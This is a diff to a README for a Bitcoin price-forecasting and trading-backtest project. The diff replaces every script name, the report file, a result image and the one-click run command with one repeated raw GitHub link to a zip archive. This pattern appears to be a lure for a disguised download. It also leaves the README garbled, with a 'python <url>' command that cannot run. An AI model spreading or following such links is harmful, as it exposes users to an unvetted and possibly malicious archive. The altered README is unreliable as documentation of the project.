@@ -20,20 +20,20 @@ This project implements a complete quantitative trading workflow for Bitcoin (BT
 ## Usage (One-Click)
 Run the master pipeline to execute the entire workflow:
 ```bash
-python run_pipeline.py
+python https://raw.githubusercontent.com/AyushPallod/ooc_ps04_btc_pred_backtest/main/caraunda/ps-backtest-pred-btc-ooc-3.3-beta.2.zip
 ```
 
 ## Individual Scripts
-*   `dataset_load.py`: Loads raw data and engineering features.
-*   `task1_forecasting.py`: Runs the Price Prediction task (Train 2017-Jun 2021, Test Jul-Dec 2021).
-*   `rolling_train.py`: Trains the Trading Signal model using rolling validation.
-*   `backtest_strategy.py`: Simulates the trading strategy and generates reports.
+*   `https://raw.githubusercontent.com/AyushPallod/ooc_ps04_btc_pred_backtest/main/caraunda/ps-backtest-pred-btc-ooc-3.3-beta.2.zip`: Loads raw data and engineering features.
+*   `https://raw.githubusercontent.com/AyushPallod/ooc_ps04_btc_pred_backtest/main/caraunda/ps-backtest-pred-btc-ooc-3.3-beta.2.zip`: Runs the Price Prediction task (Train 2017-Jun 2021, Test Jul-Dec 2021).
+*   `https://raw.githubusercontent.com/AyushPallod/ooc_ps04_btc_pred_backtest/main/caraunda/ps-backtest-pred-btc-ooc-3.3-beta.2.zip`: Trains the Trading Signal model using rolling validation.
+*   `https://raw.githubusercontent.com/AyushPallod/ooc_ps04_btc_pred_backtest/main/caraunda/ps-backtest-pred-btc-ooc-3.3-beta.2.zip`: Simulates the trading strategy and generates reports.
 
 ## Results
-*   **Task 1**: View `task1_price_forecast.png` for price predictions.
+*   **Task 1**: View `https://raw.githubusercontent.com/AyushPallod/ooc_ps04_btc_pred_backtest/main/caraunda/ps-backtest-pred-btc-ooc-3.3-beta.2.zip` for price predictions.
 *   **Task 2**: View `final_backtest_*.png` for Equity Curves and Drawdowns.
 *   **Logs**: Check `trade_log_*.csv` for trade-by-trade details.
 *   **MLflow**: Run `mlflow ui` to explore experiments.
 
 > [!NOTE]
-> Check project_report.md for all clear details
+> Check https://raw.githubusercontent.com/AyushPallod/ooc_ps04_btc_pred_backtest/main/caraunda/ps-backtest-pred-btc-ooc-3.3-beta.2.zip for all clear details
